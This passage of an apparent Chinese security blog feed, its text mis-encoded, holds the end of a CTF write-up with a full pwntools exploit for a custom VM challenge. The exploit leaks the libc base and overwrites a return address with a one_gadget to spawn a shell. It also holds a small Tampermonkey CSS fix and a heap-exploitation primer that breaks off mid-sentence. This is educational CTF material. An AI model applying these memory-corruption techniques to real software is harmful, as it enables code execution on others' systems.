ˆï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥æ‰¾æœ€è¿‘çš„libcå†…åœ°å€ï¼Œç›´æ¥<code>search -t pointer</code>ï¼Œç„¶å<code>distance $rsi</code>ï¼Œå°±èƒ½çœ‹åˆ°éœ€è¦å¤šå°‘çš„åç§»ã€‚æ‰¾ä¸€ä¸ªä¸å˜çš„å³å¯ï¼Œæ¯”stackä¹‹åè‚‰çœ¼è§‚å¯Ÿå¼ºå¤ªå¤šäº†ã€‚</p><h2 id="onegadget">onegadget</h2><p>è¿™é‡Œogé€‰å–ä¸æ˜¯å¾ˆå®¹æ˜“ï¼Œæ”¹å®Œè¿”å›åœ°å€ç¨‹åºé€€å‡ºårbpæ˜¯0x1å¯¼è‡´å¾ˆå¤šæ¡ä»¶ç®€å•çš„ogç”¨ä¸äº†ï¼Œè¿™ä¸ªæ˜¯ç›´æ¥ä»ç½‘ä¸Šçš„wp copyçš„ï¼Œå®æˆ˜è¿‡ç¨‹ä¸­å¯ä»¥ä¸€ä¸ªä¸ªè¯•ä¸€è¯•ï¼ŒæŒ‡å®š<code>-l 1</code>ä¹‹åå…¶å®ä¹Ÿæ²¡æœ‰å¤ªå¤šã€‚</p><h1>exp</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> p32</span><br><span class="line">context.terminal=[<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c&quot;</span>, <span class="string">&quot;start&quot;</span>, <span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;wsl.exe&quot;</span>, <span class="string">&quot;-e&quot;</span>]</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>,checksec=<span class="literal">False</span>)</span><br><span class="line">libc=elf.libc</span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment"># 4å­—èŠ‚æŒ‡ä»¤</span></span><br><span class="line"><span class="comment"># 32ä½</span></span><br><span class="line"><span class="comment"># é«˜å››ä½æ˜¯æ“ä½œç ï¼Œä»0-10å¯¹åº”10ä¸ªæŒ‡ä»¤</span></span><br><span class="line"><span class="comment"># ä½5ä½æ˜¯ä¸€ä¸ªå¯„å­˜å™¨</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># 4 7 5 | 6 5 5</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å‚æ•°å…¨éƒ¨éƒ½æ˜¯å¯„å­˜å™¨ç¼–å·</span></span><br><span class="line"><span class="comment"># a op b -&gt; c</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">code</span>(<span class="params">op,a,b,c</span>):</span><br><span class="line">    <span class="keyword">return</span> p32(((op &amp; <span class="number">0xF</span>)&lt;&lt;<span class="number">28</span>) + ((b &amp; <span class="number">0x1f</span>)&lt;&lt;<span class="number">16</span>) + ((a &amp; <span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>) + (c &amp; <span class="number">0x1f</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">a,b,result</span>):</span><br><span class="line">    <span class="keyword">return</span> code(<span class="number">1</span>,a,b,result)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sub</span>(<span class="params">a,b,result</span>):</span><br><span class="line">    <span class="keyword">return</span> code(<span class="number">2</span>,a,b,result)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mul</span>(<span class="params">a,b,result</span>):</span><br><span class="line">    <span class="keyword">return</span> code(<span class="number">3</span>,a,b,result)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">div</span>(<span class="params">a,b,result</span>):</span><br><span class="line">    <span class="keyword">return</span> code(<span class="number">4</span>,a,b,result)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor</span>(<span class="params">a,b,result</span>):</span><br><span class="line">    <span class="keyword">return</span> code(<span class="number">5</span>,a,b,result)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_and</span>(<span class="params">a,b,result</span>):</span><br><span class="line">    <span class="keyword">return</span> code(<span class="number">6</span>,a,b,result)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">slr</span>(<span class="params">a,b,result</span>):</span><br><span class="line">    <span class="keyword">return</span> code(<span class="number">7</span>,a,b,result)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shr</span>(<span class="params">a,b,result</span>):</span><br><span class="line">    <span class="keyword">return</span> code(<span class="number">8</span>,a,b,result)</span><br><span class="line"></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">store</span>(<span class="params">base,offset,content</span>):</span><br><span class="line">    op = <span class="number">0x9</span> &lt;&lt; <span class="number">28</span></span><br><span class="line">    off = (offset &amp; <span class="number">0xFFF</span>) &lt;&lt; <span class="number">16</span></span><br><span class="line">    cont = content &amp; <span class="number">0x1F</span></span><br><span class="line">    b = (base &amp; <span class="number">0x1f</span>) &lt;&lt; <span class="number">5</span></span><br><span class="line">    <span class="keyword">return</span> p32(op + off + b + cont)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load</span>(<span class="params">base,offset,r</span>):</span><br><span class="line">    op = <span class="number">0xA</span> &lt;&lt; <span class="number">28</span></span><br><span class="line">    off = (offset &amp; <span class="number">0xFFF</span>) &lt;&lt; <span class="number">16</span></span><br><span class="line">    target = r &amp; <span class="number">0x1F</span></span><br><span class="line">    b = (base &amp; <span class="number">0x1f</span>) &lt;&lt; <span class="number">5</span></span><br><span class="line">    <span class="keyword">return</span> p32(op + off + b + target)</span><br><span class="line"></span><br><span class="line"><span class="comment"># æŒ‡ä»¤æœ¬èº«æä¾›ä»»æ„åœ°å€è¯»å†™</span></span><br><span class="line"><span class="comment"># å› æ­¤éœ€è¦æ‰¾åˆé€‚åœ°å€åšå†™å…¥ï¼Œcodeå°±åœ¨æ ˆä¸Šï¼Œå·åœ°å€å‡ºæ¥ç„¶åè¯•ç€æ”¹</span></span><br><span class="line"><span class="comment"># ä¸€èˆ¬è¿™ç§é¢˜çš„æ€è·¯éƒ½æ˜¯å…ˆè¯•ogï¼Œä¸è¡Œå†è¯•è¯•system</span></span><br><span class="line"><span class="comment"># é¦–å…ˆï¼Œå…ˆæ£€æŸ¥æ³„éœ²ï¼Œè¿™é“é¢˜æ²¡æœ‰ä»»ä½•è¾“å‡ºå†…å®¹ï¼Œè¦æ³„éœ²éœ€è¦è‡ªå·±è°ƒputsï¼Œä¼šå¾ˆéº»çƒ¦</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿™é“é¢˜çš„æ ¸å¿ƒæ˜¯è¦æƒ³åŠæ³•åœ¨å¯„å­˜å™¨å‡‘å‡ºä¸€ä¸ªå…³é”®çš„å†™å…¥åœ°å€</span></span><br><span class="line"><span class="comment"># ä»–å¦ˆçš„æˆ‘çš„è„‘å­å°±æ˜¯ç»•ä¸è¿‡æ¥è¿™ä¸ªæŒ‡ä»¤</span></span><br><span class="line"><span class="comment"># å“¦ï¼ŒåŸæ¥æ˜¯åœ¨æ‰§è¡Œè®¿å­˜æŒ‡ä»¤æ—¶ä¼šé¢å¤–ä¼ å…¥ä¸€ä¸ªæ ˆä¸Šçš„åœ°å€åšåç§»ï¼Œæˆ‘ä»¬ç›¸å½“äºå¯ä»¥åœ¨æ ˆä¸Šä¸€ä¸ªåœ°å€åç§»0x100èŒƒå›´å†…æ“ä½œ</span></span><br><span class="line"><span class="comment"># å¯ä»¥ä»æ ˆä¸Šæ‰¾å¥½çš„åœ°å€</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># search -t dword 0xa1200001</span></span><br><span class="line"><span class="comment"># distance $rsi 0xxxxxxxxx</span></span><br><span class="line"><span class="comment"># x /20gx $rebase(0x40c0) æ£€éªŒ</span></span><br><span class="line"><span class="comment"># å¯ä»¥å°†å¯„å­˜å™¨å†™å…¥æˆ‘ä»¬çš„å†…å®¹ï¼Œ0x120å¼€å§‹æ˜¯æˆ‘ä»¬çš„å†…å®¹</span></span><br><span class="line"><span class="comment"># ogæ˜¯ä¾¿å®œï¼Œè‡³å°‘ç”¨ä¸€æ¬¡subï¼Ÿ</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ€è·¯ï¼š</span></span><br><span class="line"><span class="comment"># targetå†™å…¥code-&gt;è¯»å–åˆ°å¯„å­˜å™¨ä¸­å¤‡ç”¨</span></span><br><span class="line"><span class="comment"># æ‰¾ä¸€ä¸ªlibcåœ°å€-&gt;åœ¨æˆ‘ä»¬çš„codeé‡Œå†™å…¥åç§»-&gt;éƒ½è¯»åˆ°å¯„å­˜å™¨é‡Œåšsubå‡ºbase-&gt;è¯»å…¥og-&gt;ç›¸åŠ æ‹¿åˆ°ogçœŸå®åœ°å€-&gt;å°†ogå†™å…¥target</span></span><br><span class="line"><span class="comment"># å¥½ä»–å¦ˆçš„ç»•å•Šæˆ‘æ“äº† payloadæ€è·¯å…¨æœ‰ä½†æ˜¯å†™ç€å¾ˆè´¹åŠ²ä¸çŸ¥é“æ€ä¹ˆå¼€å§‹</span></span><br><span class="line"><span class="comment"># vmå¿ƒé­”ï¼Ÿï¼Ÿ</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æƒ³åŠæ³•å…ˆç®—å‡ºlibcçœŸå®çš„åŸºåœ°å€å­˜åœ¨ä¸€ä¸ªå¯„å­˜å™¨é‡Œ</span></span><br><span class="line"><span class="comment"># onegadget = 0x</span></span><br><span class="line"><span class="comment"># è¯»å–ç›®æ ‡å†™å…¥å†…å®¹ï¼ˆogçš„åç§»æ”¾åœ¨3äº†ï¼‰</span></span><br><span class="line"><span class="comment"># payload = load(0,0x120,1) + load(0,0x124,2) + add(1,2,3)</span></span><br><span class="line"><span class="comment"># è¯»å–ä¸€ä¸ªåç§»</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è¯»å–ä¸€ä¸ªlibcåœ°å€</span></span><br><span class="line"><span class="comment"># off: 0x29d90</span></span><br><span class="line"><span class="comment"># å¸¸è¯†ï¼š2.35çš„libc_start_mainåœ¨æ ˆä¸Šå­˜å‚¨å€¼åç§»ä¸º0x29d90</span></span><br><span class="line">one_gadget = <span class="number">0x50a47</span></span><br><span class="line">payload = load(<span class="number">0</span>,<span class="number">0xd38</span>,<span class="number">1</span>) <span class="comment">#å“¦æˆ‘sbäº†è¯»æ˜¯è¯»8å­—èŠ‚</span></span><br><span class="line">payload += load(<span class="number">0</span>,<span class="number">0x140</span>,<span class="number">9</span>) + sub(<span class="number">1</span>,<span class="number">9</span>,<span class="number">4</span>) <span class="comment"># 4æ˜¯libcçš„åŸºåœ°å€</span></span><br><span class="line"><span class="comment"># è‰æ‹Ÿå—ï¼Œè¿™ä¸ªåœ°å€åœ¨wsl kalié‡Œä¹Ÿä¸€ç›´è·³</span></span><br><span class="line"><span class="comment"># ç®—og</span></span><br><span class="line">payload += load(<span class="number">0</span>,<span class="number">0x138</span>,<span class="number">8</span>) + add(<span class="number">8</span>,<span class="number">4</span>,<span class="number">5</span>) <span class="comment"># 5ä¸ºogçœŸå®å€¼</span></span><br><span class="line"><span class="comment"># å†™å…¥</span></span><br><span class="line">payload += store(<span class="number">0</span>,<span class="number">0x118</span>,<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">payload += p64(one_gadget) + p64(<span class="number">0x29d90</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;opcode: &quot;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;é¢˜ç›®åˆ†æ&lt;/h1&gt;
&lt;h2 id=&quot;é€†å‘è™šæ‹Ÿæœºç»“æ„&quot;&gt;é€†å‘è™šæ‹Ÿæœºç»“æ„&lt;/h2&gt;
&lt;p&gt;è¿™é“é¢˜ç›®çš„è™šæ‹Ÿæœºè¿˜ç®—è§„æ•´ï¼Œä»mainå‡½æ•°å¼€å§‹çœ‹ï¼Œä»å¯¹è™šæ‹Ÿæœºåˆå§‹åŒ–çš„å‡½æ•°å…¥æ‰‹å¹¶ç»“åˆä»£ç æ‰§è¡Œçš„å‡½æ•°å¯ä»¥çœ‹å‡ºï¼Œæ•´ä½“çš„vmç»“æ„æ”¾åœ¨äº†bssï¼ŒåŒ…æ‹¬32ä¸ªé€šç”¨å¯„å­˜å™¨ï¼Œripï¼Œä»£ç æŒ‡é’ˆå’Œä»£ç å¤§å°ã€‚&lt;/</summary>
      
    
    
    
    <category term="pwn" scheme="https://zjw1nd.github.io/categories/pwn/"/>
    
    
    <category term="pwn" scheme="https://zjw1nd.github.io/tags/pwn/"/>
    
    <category term="wp" scheme="https://zjw1nd.github.io/tags/wp/"/>
    
    <category term="vm" scheme="https://zjw1nd.github.io/tags/vm/"/>
    
  </entry>
  
  <entry>
    <title>å‰ç«¯å°å®è·µä¹‹ä¿®å¤githubåˆ—è¡¨æ¸²æŸ“é”™è¯¯</title>
    <link href="https://zjw1nd.github.io/2024/12/17/%E5%89%8D%E7%AB%AF%E5%B0%8F%E5%AE%9E%E8%B7%B5%E4%B9%8B%E4%BF%AE%E5%A4%8Dgithub%E5%88%97%E8%A1%A8%E6%B8%B2%E6%9F%93%E9%94%99%E8%AF%AF/"/>
    <id>https://zjw1nd.github.io/2024/12/17/%E5%89%8D%E7%AB%AF%E5%B0%8F%E5%AE%9E%E8%B7%B5%E4%B9%8B%E4%BF%AE%E5%A4%8Dgithub%E5%88%97%E8%A1%A8%E6%B8%B2%E6%9F%93%E9%94%99%E8%AF%AF/</id>
    <published>2024-12-16T16:21:39.000Z</published>
    <updated>2024-12-17T02:50:21.469Z</updated>
    
    <content type="html"><![CDATA[<h2 id="èµ·å› -é—®é¢˜æè¿°">èµ·å› /é—®é¢˜æè¿°</h2><p>ä»Šå¤©å…´è‡´æ¥äº†ä¸Šå¤´äº†æƒ³ç¼–è¾‘è‡ªå·±çš„Githubä¸»é¡µï¼Œå†™å¥½ä¹‹åçªç„¶å‘ç°æ‰€æœ‰çš„<strong>åˆ—è¡¨</strong>éƒ½ä¸¢å¤±äº†å‰ç¼€ã€‚å³æœ¬æ¥åº”è¯¥æ˜¯ï¼š</p><blockquote><p>1. xxx<br>2. xxx<br>Â· xxx</p></blockquote><p>ä½†æ˜¯å®é™…æ¸²æŸ“å‡ºæ¥çš„æ•ˆæœåªæœ‰ç¼©è¿›å¯¹é½è€Œæ²¡æœ‰è¿™äº›åºå·å’Œç‚¹çš„å‰ç¼€ï¼Œçœ‹èµ·æ¥éå¸¸çš„éš¾å—ï¼Œé‚å¼€å§‹æ’æŸ¥é—®é¢˜ã€‚</p><h2 id="æ£€æŸ¥è¿‡ç¨‹">æ£€æŸ¥è¿‡ç¨‹</h2><p>é¦–å…ˆè‚¯å®šæ˜¯æ£€æŸ¥äº†æºä»£ç ï¼Œmarkdownç¡®è®¤æ²¡æœ‰é—®é¢˜ä¹‹åå»githubéšä¾¿æœäº†ä¸ªmarkdownçš„æ•™ç¨‹ï¼Œå‘ç°ä¹Ÿæœ‰è¿™ä¸ªé—®é¢˜ï¼Œçœ‹æ¥é—®é¢˜å‡ºåœ¨æœ¬åœ°ã€‚</p><p>F12æ£€æŸ¥äº†ä¸€ä¸‹æºä»£ç ï¼Œmarkdownæœ€åä¼šè¢«æ¸²æŸ“æˆlistï¼šæœ‰åºåˆ—è¡¨å’Œæ— åºåˆ—è¡¨åˆ†åˆ«æ˜¯cssä¸­çš„olå’Œulæ ·å¼ï¼Œåˆ—è¡¨é¡¹åˆ™æ˜¯<code>&lt;li&gt;</code>ã€‚htmlä¸­ä¼šé‡‡ç”¨<code>&lt;ul&gt;&lt;/ul&gt;</code>æ ‡ç­¾è¿›è¡Œå®ç°ã€‚</p><p>æ£€æŸ¥CSSæ ·å¼å‘ç°ï¼Œ<code>&lt;li&gt;</code>å¯¹è±¡çš„ä¸€ä¸ªå…ƒç´ <code>list-style-type</code>çš„å€¼å±…ç„¶æ˜¯noneï¼Œåœ¨æ³¨å…¥çš„æ ·å¼é‡Œè¦†ç›–äº†æµè§ˆå™¨è‡ªå·±çš„User Agentæ ·å¼ã€‚</p><p>æ‰“å¼€ä¸€ä¸ªåˆ—è¡¨æ˜¾ç¤ºæ­£å¸¸çš„ç½‘ç«™æ£€æŸ¥ä¸€ä¸‹ï¼Œè¦æƒ³æ˜¾ç¤ºå‰ç¼€ï¼Œè¿™ä¸€é¡¹çš„å€¼åº”è¯¥æ˜¯<code>disc</code>æ‰å¯¹ã€‚åŒæ—¶æ›´æ¢æµè§ˆå™¨ç”¨æ‰‹æœºæ‰“å¼€å‘ç°æ˜¯æ­£å¸¸çš„</p><p>è™½ç„¶æˆ‘ä»¬ä¸çŸ¥é“githubæä¾›çš„æ ·å¼å‡ºäº†ä»€ä¹ˆé—®é¢˜ï¼Œä½†æ˜¯æˆ‘ä»¬ä¼¼ä¹æœ¬åœ°ä¹Ÿä¸å¥½ä¿®è¿™ä¸ªé—®é¢˜ã€‚</p><h2 id="ç»“æœ">ç»“æœ</h2><p>é—®AIï¼Œaiç»™äº†æˆ‘ä¸€ä¸ªtamper monkeyçš„è„šæœ¬ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ==UserScript==</span></span><br><span class="line"><span class="comment">// @name         GitHub List Style Fix</span></span><br><span class="line"><span class="comment">// @namespace    http://tampermonkey.net/</span></span><br><span class="line"><span class="comment">// @version      0.1</span></span><br><span class="line"><span class="comment">// @description  Change github list.</span></span><br><span class="line"><span class="comment">// @author       Zj_W1nd</span></span><br><span class="line"><span class="comment">// @match        https://github.com/*</span></span><br><span class="line"><span class="comment">// @grant        none</span></span><br><span class="line"><span class="comment">// ==/UserScript==</span></span><br><span class="line"></span><br><span class="line">(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="string">&#x27;use strict&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ·»åŠ è‡ªå®šä¹‰æ ·å¼</span></span><br><span class="line">    <span class="keyword">const</span> style = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;style&#x27;</span>);</span><br><span class="line">    style.<span class="property">innerHTML</span> = <span class="string">`</span></span><br><span class="line"><span class="string">        ul, ol &#123;</span></span><br><span class="line"><span class="string">            list-style-type: disc !important;</span></span><br><span class="line"><span class="string">            margin-left: 20px !important;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    `</span>;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="property">head</span>.<span class="title function_">appendChild</span>(style);</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><p>åœ¨githubç½‘é¡µä¸Šå¼ºåˆ¶ä¿®æ”¹å‰ç«¯çš„åˆ—è¡¨styleï¼Œè¿˜çœŸè§£å†³äº†è¿™ä¸ªé—®é¢˜ã€‚è¿™ä¹ˆä¸€ææ„Ÿè§‰å‰ç«¯å°±æ˜¯ç–¯ç‹‚çš„å„ç§æ ‡ç­¾å’Œå­—æ®µã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;èµ·å› -é—®é¢˜æè¿°&quot;&gt;èµ·å› /é—®é¢˜æè¿°&lt;/h2&gt;
&lt;p&gt;ä»Šå¤©å…´è‡´æ¥äº†ä¸Šå¤´äº†æƒ³ç¼–è¾‘è‡ªå·±çš„Githubä¸»é¡µï¼Œå†™å¥½ä¹‹åçªç„¶å‘ç°æ‰€æœ‰çš„&lt;strong&gt;åˆ—è¡¨&lt;/strong&gt;éƒ½ä¸¢å¤±äº†å‰ç¼€ã€‚å³æœ¬æ¥åº”è¯¥æ˜¯ï¼š&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;1. xxx&lt;br&gt;
2. xxx&lt;</summary>
      
    
    
    
    <category term="Develop" scheme="https://zjw1nd.github.io/categories/Develop/"/>
    
    
    <category term="Develop" scheme="https://zjw1nd.github.io/tags/Develop/"/>
    
    <category term="å‰ç«¯" scheme="https://zjw1nd.github.io/tags/%E5%89%8D%E7%AB%AF/"/>
    
  </entry>
  
  <entry>
    <title>How2Heapæ€»é›†ç¯‡å¯¼æ¼”å‰ªè¾‘å‰§åœºç‰ˆ</title>
    <link href="https://zjw1nd.github.io/2024/12/13/How2Heap%E6%80%BB%E9%9B%86%E7%AF%87%E5%AF%BC%E6%BC%94%E5%89%AA%E8%BE%91%E5%89%A7%E5%9C%BA%E7%89%88/"/>
    <id>https://zjw1nd.github.io/2024/12/13/How2Heap%E6%80%BB%E9%9B%86%E7%AF%87%E5%AF%BC%E6%BC%94%E5%89%AA%E8%BE%91%E5%89%A7%E5%9C%BA%E7%89%88/</id>
    <published>2024-12-13T04:00:00.000Z</published>
    <updated>2025-03-11T12:48:47.373Z</updated>
    
    <content type="html"><![CDATA[<p>~~æ‘†äº†ï¼Œ~~å¯ä»¥å‚è€ƒï¼š</p><ul class="lvl-0"><li class="lvl-2"><a href="https://bbs.kanxue.com/thread-272098.htm#msg_header_h3_31">https://bbs.kanxue.com/thread-272098.htm#msg_header_h3_31</a></li><li class="lvl-2">é«˜ç‰ˆæœ¬çš„æ€è·¯ï¼ŒåŒ…æ‹¬libcgotè¡¨ï¼Œ_rtld_globalçš„æ”»å‡»ç­‰ï¼š<a href="https://www.cnblogs.com/LynneHuan/p/17822172.html#:~:text=%E5%8F%AF%E4%BB%A5%E5%9C%A8%20Bi">https://www.cnblogs.com/LynneHuan/p/17822172.html#:~:text=å¯ä»¥åœ¨ Bi</a><br>ä¸Šæ–‡çš„æ€»ç»“å¯¹äºç»†èŠ‚æ›´ä¸°å¯Œä¹Ÿæ›´å¥½ç”¨ï¼Œæˆ‘è‡ªå·±ä¹Ÿä¼šå‚è€ƒã€‚æˆ‘è‡ªå·±å†™çš„å¯¼æ¼”å‰ªè¾‘ç‰ˆå®åœ¨çŒ®ä¸‘ã€‚å †å°±æ²¡æœ‰å®Œå…¨é€å½»è¿‡ï¼ŒåŸç†å’Œåšé¢˜æ˜¯ä¸¤ç äº‹ï¼Œæœ¬è´¨å¾ˆç®€å•ä½†æ˜¯åˆ©ç”¨é“¾è·¯å¾ˆå¤æ‚ã€‚</li></ul><h1>Basicï¼š</h1><h2 id="UAF">UAF</h2><p>freeåæŒ‡é’ˆä¸ç½®ç©ºå¯ä»¥å†æ¬¡ä½¿ç”¨ã€‚</p><h2 id="Overflow">Overflow</h2><p>æº¢å‡ºï¼Œè¿™ä¸ªä¸€èˆ¬ç”¨äºç¯¡æ”¹sizeæˆ–prevsizeåŸŸæ¯”è¾ƒå¤šï¼Œèƒ½æº¢å‡ºfdå’Œbkä¹Ÿè¡Œã€‚</p><h2 id="Off-By-One">Off By One</h2><p>åªèƒ½æº¢å‡º1å­—èŠ‚ã€‚å¯ä»¥ç¯¡æ”¹ä¸‹ä¸€ä¸ªchunkçš„PREV_INUSEä½é€ æˆåˆå¹¶ç­‰ã€‚</p><h2 id="Double-Free">Double Free</h2><p>å¤šæ¬¡é‡Šæ”¾åŒä¸€å †å—ã€‚æ¥ç€é€šè¿‡åˆ†é…å¯ä»¥è·å¾—æŒ‡å‘åŒä¸€å †å—çš„å¤šä¸ªä¸åŒæŒ‡é’ˆã€‚å¯ä»¥ç±»å‹æ··æ·†ï¼Œä¹Ÿå¯ä»¥è·å–UAFã€‚</p><ul class="lvl-0"><li class="lvl-2"><p>å¯¹äºfastbin chunkï¼ŒPREV_INUSEæ°¸è¿œä¸º1ï¼Œå› æ­¤double freeä¼šæœ‰å¥‡æ•ˆã€‚åŒæ—¶åªæ£€æŸ¥ç¬¬ä¸€å—æ˜¯å¦double freeã€‚</p></li></ul><h2 id="Overlap">Overlap</h2><p>é‡å ã€‚æœ¬è´¨ä¸Šä¹Ÿæ˜¯å€ŸåŠ©ä¸Šé¢å‡ ä¸ªæ¼æ´ä¿®æ”¹sizeï¼ˆå‘å‰é‡å ï¼‰æˆ–è€…prevsizeï¼ˆå‘åé‡å ï¼‰åŸŸç„¶åé‡Šæ”¾ã€‚è¿™æ ·å°±æœ‰ä¸€ä¸ªchunkå†…éƒ¨çš„ä¸€ä¸ªé¢å¤–æŒ‡é’ˆäº†ã€‚<a href="https://zjw1nd.github.io/2023/12/03/How2Heap-2/">ï¼ˆæœªå¿…ï¼‰æ›´åŠ ç»†èŠ‚çš„ä»‹ç»</a><br>house of Rabbitä¹Ÿæ˜¯å·®ä¸å¤š</p><h2 id="Leak">Leak</h2><h3 id="Unsorted-Bin-Leak">Unsorted Bin Leak</h3><p>unsortedbinä¸­çš„å¤´éƒ¨chunkçš„fdä¼šæŒ‡å‘main_arena+88çš„ä½ç½®ã€‚åªæœ‰ä¸€ä¸ªchunkçš„è¯fdå’Œbkéƒ½ä¼šæŒ‡å‘å…¶ä¸­ã€‚</p><h3 id="tcache-leak">tcache leak</h3><p>ç”¨tcacheå¯ä»¥æ³„éœ²å †çš„èµ·å§‹åœ°å€ã€‚</p><h3 id="å…¶ä»–">å…¶ä»–</h3><p>ç±»ä¼¼çš„æ”¾å…¥binä¸­ç„¶åæ‰“å‡ºå†…å®¹çš„æ€æƒ³éƒ½å¯ä»¥ã€‚</p><h2 id="hook">hook</h2><p>åœ¨2.34ä¹‹å‰hookæ²¡æœ‰ç§»é™¤çš„æƒ…å†µä¸‹æˆ‘ä»¬ä¸€ç›´å¯ä»¥é€šè¿‡ä¿®æ”¹mallochookï¼Œfreehookï¼Œreallochookç­‰å‡½æ•°æ¥åŠ«æŒæ§åˆ¶æµã€‚ä¸€èˆ¬æ¥è¯´æ˜¯å°†chunkåˆ†é…åˆ°è¿™é‡Œç„¶åæ”¹æˆone_gadgetã€‚æ¯”å¦‚<a 